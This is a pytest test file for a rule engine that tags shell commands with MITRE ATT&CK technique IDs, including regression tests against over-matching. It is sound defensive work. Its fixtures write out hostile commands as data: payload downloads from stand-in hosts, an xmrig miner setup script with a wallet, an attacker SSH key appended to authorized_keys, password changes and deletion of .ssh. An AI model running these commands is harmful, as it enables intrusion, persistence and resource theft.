import pytest

from app.services.compaction import CompactedCommand
from app.services.mitre.catalog import is_known_technique, load_catalog
from app.services.mitre.rules import apply_rules, load_rules

POSITIVE = [
    ("wget http://198.51.100.7/x.sh", "T1105"),
    ("curl -O https://evil.example/payload", "T1105"),
    ("chmod 777 malicious_script", "T1222.002"),
    ("chmod +x payload", "T1222.002"),
    ("uname -a", "T1082"),
    ("cat /proc/cpuinfo", "T1082"),
    ("cat /etc/passwd", "T1003.008"),
    ('echo "ssh-rsa AAAA" >> .ssh/authorized_keys', "T1098.004"),
    ("sh setup_c3pool_miner.sh WALLET", "T1496"),
    ("rm -rf .ssh", "T1070.004"),
    ("ps aux", "T1057"),
    ("netstat -tulpn", "T1049"),
]

NEGATIVE = [
    ("echo wget is a tool", "T1105"),
    ("ls -la", "T1222.002"),
    ("cd /tmp", "T1082"),
    ("cat notes.txt", "T1003.008"),
]


def _hit_ids(command_text: str) -> set[str]:
    command = CompactedCommand(
        event_id="e1", timestamp="2026-08-20T10:00:00Z", command=command_text
    )
    hits, _ = apply_rules([command])
    return {h.rule.id for h in hits}


@pytest.mark.parametrize(("command", "technique"), POSITIVE)
def test_rule_matches_expected_command(command: str, technique: str) -> None:
    assert technique in _hit_ids(command)


@pytest.mark.parametrize(("command", "technique"), NEGATIVE)
def test_rule_does_not_over_match(command: str, technique: str) -> None:
    assert technique not in _hit_ids(command)


def test_every_rule_id_exists_in_the_attack_catalog() -> None:
    for rule in load_rules():
        assert is_known_technique(rule.id), f"{rule.id} is not a real ATT&CK technique"


def test_rule_names_and_tactics_match_the_catalog() -> None:
    catalog = load_catalog()
    for rule in load_rules():
        entry = catalog[rule.id]
        assert rule.tactic == entry.tactic, f"{rule.id} tactic drifted from catalog"


def test_unmatched_commands_are_returned_for_llm_gapfill() -> None:
    commands = [
        CompactedCommand(event_id="e1", timestamp="t", command="wget http://x/y"),
        CompactedCommand(event_id="e2", timestamp="t", command="dmidecode -s system-manufacturer"),
    ]
    hits, unmatched = apply_rules(commands)

    assert {h.rule.id for h in hits} == {"T1105"}
    assert [c.event_id for c in unmatched] == ["e2"]


def test_hits_carry_the_citing_event_id() -> None:
    commands = [
        CompactedCommand(
            event_id="seed-botnet-01-008",
            timestamp="2026-08-20T10:00:20Z",
            command="wget http://198.51.100.7/malicious_script",
        )
    ]
    hits, _ = apply_rules(commands)

    assert hits[0].event_id == "seed-botnet-01-008"
    assert hits[0].command == "wget http://198.51.100.7/malicious_script"


def test_reading_etc_passwd_is_not_mistaken_for_account_access_removal() -> None:
    """Regression: a bare `passwd` pattern also matches inside "/etc/passwd",
    which would wrongly tag a read-only recon command (T1003.008) with
    T1531 (Account Access Removal). Viewing the file is not disabling an
    account; only invoking the `passwd` command is.
    """
    assert _hit_ids("cat /etc/passwd") == {"T1003.008"}
    assert _hit_ids("cat /etc/passwd.bak") == {"T1003.008"}
    assert "T1531" in _hit_ids("passwd root")
    assert "T1531" in _hit_ids('echo -e "hacked123" | passwd')


# Fix round 2: reference-vs-execution over-matching. A trigger word appearing
# inside an echo argument, a quoted string, a shell comment, a grep pattern,
# or a filename argument to ls/find/cat is DATA, not an invocation of the
# tool, and must not earn provenance OBSERVED. `find / -name authorized_keys`
# and `ls -la ~/.ssh/authorized_keys` are deliberate exceptions: T1083 (File
# and Directory Discovery) is unrelated, pre-existing, correct behavior --
# literally running `ls`/`find` on a path IS discovery regardless of which
# filename is being searched for or listed. The only thing being asserted
# absent in those two rows is T1098.004.
ADVERSARIAL_NEGATIVE: list[tuple[str, set[str]]] = [
    ('echo "download with wget http://x"', set()),
    ("cat readme.txt # see wget http://example.com", set()),
    ('grep -r "wget http://" /var/log', set()),
    ("echo chmod 777", set()),
    ('echo "chmod 777 test"', set()),
    ("grep uname script.sh", set()),
    ("ls -la ~/.ssh/authorized_keys", {"T1083"}),
    ("find / -name authorized_keys", {"T1083"}),
    ("cat /etc/ssh/sshd_config | grep authorized_keys", set()),
]


@pytest.mark.parametrize(("command", "expected_hits"), ADVERSARIAL_NEGATIVE)
def test_reference_is_not_mistaken_for_execution(command: str, expected_hits: set[str]) -> None:
    assert _hit_ids(command) == expected_hits


COMMAND_POSITION_POSITIVE = [
    ("cd /tmp && wget http://198.51.100.7/x", "T1105"),
    ("cd /tmp && id", "T1033"),
    ('echo "ssh-rsa AAAA" >> .ssh/authorized_keys', "T1098.004"),
]


@pytest.mark.parametrize(("command", "technique"), COMMAND_POSITION_POSITIVE)
def test_command_position_anchoring_still_detects_real_chained_commands(
    command: str, technique: str
) -> None:
    """Anchoring a trigger to "start of command or right after a chain
    operator" must not break detection of a real technique invoked after
    `&&`/`;`/`|` -- it should, if anything, catch MORE of these than a bare
    `^` anchor would (e.g. `cd /tmp && id` did not match T1033 before this
    fix because the old pattern only anchored to the very start of the
    string).
    """
    assert technique in _hit_ids(command)


def test_ssh_authorized_keys_requires_a_write_not_a_reference() -> None:
    """T1098.004's only trigger is the literal string "authorized_keys",
    with no verb requirement at all -- the weakest rule in the file. Reading,
    listing, or searching for the file must not match; only a redirect or
    `tee` writing into it (i.e. actually installing a key) should.
    """
    assert "T1098.004" not in _hit_ids("cat ~/.ssh/authorized_keys")
    assert "T1098.004" not in _hit_ids("ls -la ~/.ssh/authorized_keys")
    assert "T1098.004" not in _hit_ids("find / -name authorized_keys")
    assert "T1098.004" not in _hit_ids("cat /etc/ssh/sshd_config | grep authorized_keys")
    assert "T1098.004" in _hit_ids('echo "ssh-rsa AAAA" >> .ssh/authorized_keys')
    assert "T1098.004" in _hit_ids("cat id_rsa.pub | tee -a ~/.ssh/authorized_keys")


SEED_CORPUS_COMMANDS: list[tuple[str, frozenset[str]]] = [
    ("uname -a", frozenset({"T1082"})),
    ("cat /proc/cpuinfo", frozenset({"T1082"})),
    ("free -m", frozenset({"T1082"})),
    ("cd /tmp", frozenset()),
    ("wget http://198.51.100.7/malicious_script", frozenset({"T1105"})),
    ("chmod 777 malicious_script", frozenset({"T1222.002"})),
    ("sh malicious_script", frozenset()),
    ("nproc", frozenset({"T1082"})),
    (
        "wget https://raw.githubusercontent.com/c3pool/xmrig_setup/master/setup_c3pool_miner.sh",
        frozenset({"T1105", "T1496"}),
    ),
    (
        "sh setup_c3pool_miner.sh 4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP",
        frozenset({"T1496", "T1059.004"}),
    ),
    ('echo -e "hacked123" | passwd', frozenset({"T1531"})),
    ("ls -la", frozenset({"T1083"})),
    ("cat /etc/os-release", frozenset({"T1082"})),
    ("ps aux", frozenset({"T1057"})),
    ("netstat -tulpn", frozenset({"T1049"})),
    ("uptime", frozenset({"T1082"})),
    ("id", frozenset({"T1033"})),
    ("cd home && rm -rf .ssh", frozenset({"T1070.004"})),
    ("mkdir .ssh", frozenset()),
    (
        'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7attacker" >> .ssh/authorized_keys',
        frozenset({"T1098.004"}),
    ),
    ("chmod -R go= home/.ssh && cd home", frozenset({"T1222.002"})),
    ("dmidecode -s system-manufacturer", frozenset()),
    ("cat /sys/class/dmi/id/product_name", frozenset()),
    ("ip route show default", frozenset()),
    ("systemctl list-units --type=service --state=running", frozenset()),
]


@pytest.mark.parametrize(("command", "expected_hits"), SEED_CORPUS_COMMANDS)
def test_seed_corpus_hits_are_unchanged_by_command_position_anchoring(
    command: str, expected_hits: frozenset[str]
) -> None:
    """Every distinct command drawn from the six seed corpus fixtures must
    produce exactly the same rule-hit set after command-position anchoring
    as it did before. Anchoring only removes matches where a verb wasn't in
    command position (a case that never occurs in the seed corpus) or adds
    matches after a chain operator (also not present here except `id` and
    `rm`, which were already in command position) -- so no seed command's
    hit set is expected to change.
    """
    assert _hit_ids(command) == set(expected_hits)


# Fix round 3: over-anchoring introduced false negatives (a real command
# fronted by a wrapper binary was silently missed), a residual T1098.004
# substring-anchoring bug (the redirect target only had to CONTAIN
# "authorized_keys", not equal it), and an escalation of the round-2 issue
# to the permissive path/identifier rules (T1003.008, T1082's path
# alternatives, T1496), which have no verb to command-position anchor and
# so still tripped on an echoed/grepped reference.
WRAPPER_POSITIVE = [
    ("sudo wget http://x", "T1105"),
    ("nohup wget http://x &", "T1105"),
    ("env FOO=1 wget http://x", "T1105"),
    ("timeout 5 curl http://x", "T1105"),
    ('bash -c "wget http://x"', "T1105"),
    ("cd /tmp && sudo wget http://x", "T1105"),
]


@pytest.mark.parametrize(("command", "technique"), WRAPPER_POSITIVE)
def test_wrapper_prefixed_commands_still_match(command: str, technique: str) -> None:
    """A real invocation fronted by sudo/nohup/env/timeout/bash -c is not
    exotic -- it is ordinary in real intrusions -- and command-position
    anchoring must not blind the rulebook to it. Only wrappers that EXECUTE
    their argument belong in this allowance; echo/grep (which print or
    search it) are deliberately excluded, see
    test_reference_is_not_mistaken_for_execution above.
    """
    assert technique in _hit_ids(command)


def test_newline_separated_commands_are_each_checked_independently() -> None:
    """A compacted command can, in principle, carry more than one shell
    line. `^` alone only anchors at position 0, so a second command after a
    literal newline could never be in "command position" and would be
    silently dropped. Newlines are normalized to ';' before matching so
    each line gets the same command-position treatment as a chained
    command.
    """
    hits = _hit_ids("id\nwget http://x")
    assert hits == {"T1033", "T1105"}


T1098_SUBSTRING_ANCHOR_NEGATIVE = [
    "echo hi > authorized_keys_backup.txt",
    "cat pwn > /tmp/authorized_keys.bak",
]


@pytest.mark.parametrize("command", T1098_SUBSTRING_ANCHOR_NEGATIVE)
def test_authorized_keys_write_target_must_be_the_whole_filename(command: str) -> None:
    """The redirect target must be exactly "authorized_keys" (optionally
    inside a longer path, e.g. ".ssh/authorized_keys"), not merely contain
    it as a prefix of a differently-named file. Writing to
    "authorized_keys_backup.txt" or "authorized_keys.bak" is not installing
    an SSH key.
    """
    assert "T1098.004" not in _hit_ids(command)


def test_authorized_keys_on_the_read_side_of_a_redirect_does_not_match() -> None:
    """`echo authorized_keys > notes.txt` writes the word "authorized_keys"
    into notes.txt -- the trigger string is data being printed, not the
    write target. And `rm ~/.ssh/authorized_keys` deletes the file (already
    correctly T1070.004) without writing to it at all.
    """
    assert "T1098.004" not in _hit_ids("echo authorized_keys > notes.txt")
    assert _hit_ids("rm ~/.ssh/authorized_keys") == {"T1070.004"}


# Escalation: the round-2 fix left T1003.008, T1082's path alternatives, and
# T1496 unanchored, arguing they are high-specificity strings unlikely to
# appear incidentally. That argument does not survive an echoed or grepped
# reference. Decision: apply the SAME data-segment filter used for every
# other rule (drop echo/printf/grep-family segments before matching) so the
# precision bar is uniform across all thirteen rules, not verb-dependent.
# grep's search pattern is explicitly included in the filter (not just
# echo/printf): grep -r xmrig /var/log is Discovery of a string, not
# Resource Hijacking, and treating it otherwise would keep exactly the same
# inconsistency in a different rule.
PATH_IDENTIFIER_REFERENCE_NEGATIVE = [
    ('echo "check /etc/passwd"', "T1003.008"),
    ("grep xmrig /var/log/syslog", "T1496"),
]


@pytest.mark.parametrize(("command", "technique"), PATH_IDENTIFIER_REFERENCE_NEGATIVE)
def test_path_and_identifier_rules_are_not_exempt_from_reference_filtering(
    command: str, technique: str
) -> None:
    assert _hit_ids(command) == set()
    assert technique not in _hit_ids(command)


def test_all_round_1_and_round_2_probes_still_hold() -> None:
    """Consolidated non-regression sweep: every probe introduced by the
    first two review rounds, re-checked after the round-3 wrapper/segment
    changes. Failing any of these would mean the fix for one problem broke
    the fix for an earlier one.
    """
    for command, technique in POSITIVE:
        assert technique in _hit_ids(command), f"round-1 positive regressed: {command!r}"
    for command, technique in NEGATIVE:
        assert technique not in _hit_ids(command), f"round-1 negative regressed: {command!r}"
    for command, expected in ADVERSARIAL_NEGATIVE:
        assert _hit_ids(command) == expected, f"round-2 adversarial regressed: {command!r}"
    for command, technique in COMMAND_POSITION_POSITIVE:
        assert technique in _hit_ids(command), f"round-2 chained positive regressed: {command!r}"
    for command, expected in SEED_CORPUS_COMMANDS:
        assert _hit_ids(command) == set(expected), f"seed corpus hit set regressed: {command!r}"
